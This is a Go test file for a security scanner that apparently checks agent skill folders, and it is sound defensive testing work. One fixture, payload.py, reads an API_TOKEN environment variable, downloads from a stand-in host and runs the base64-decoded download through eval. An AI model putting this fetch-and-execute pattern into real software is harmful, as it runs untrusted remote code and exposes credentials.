package securityscan_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/aibox/skillbox/internal/skills/securityscan"
)

func TestScannerReportsRequestedCapabilitiesAndNeverClaimsSafe(t *testing.T) {
	root := t.TempDir()
	content := `import os, subprocess, requests, importlib, base64
token = os.getenv("API_TOKEN")
data = requests.get("https://example.com/payload")
subprocess.run(["external-tool"])
eval(base64.b64decode(data.content))
open("output.txt", "wb").write(data.content)
`
	if err := os.WriteFile(filepath.Join(root, "payload.py"), []byte(content), 0o700); err != nil {
		t.Fatal(err)
	}
	report, err := securityscan.Default().Scan(root)
	if err != nil {
		t.Fatal(err)
	}
	for _, capability := range []string{"filesystem", "network", "subprocess/shell", "eval/exec", "environment", "credentials", "dynamic loading", "obfuscation", "downloads", "external binaries"} {
		if !contains(report.Capabilities, capability) {
			t.Errorf("missing capability %q in %#v", capability, report.Capabilities)
		}
	}
	if len(report.Findings) == 0 || !strings.Contains(strings.ToLower(report.Recommendation), "manual review") || strings.Contains(strings.ToUpper(report.Recommendation), "SAFE") {
		t.Fatalf("report=%#v", report)
	}
}

func TestNoFindingsStillRequiresManualReviewAndCustomRulesWork(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "notes.txt"), []byte("ACME_CAPABILITY\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	custom := securityscan.PatternRule("acme", "custom", "low", `ACME_CAPABILITY`)
	report, err := securityscan.New(custom).Scan(root)
	if err != nil || len(report.Findings) != 1 || report.Findings[0].Capability != "custom" {
		t.Fatalf("report=%#v err=%v", report, err)
	}
	empty, err := securityscan.New().Scan(root)
	if err != nil || len(empty.Findings) != 0 || !strings.Contains(strings.ToLower(empty.Recommendation), "manual review") {
		t.Fatalf("empty=%#v err=%v", empty, err)
	}
}

func contains(values []string, wanted string) bool {
	for _, value := range values {
		if value == wanted {
			return true
		}
	}
	return false
}
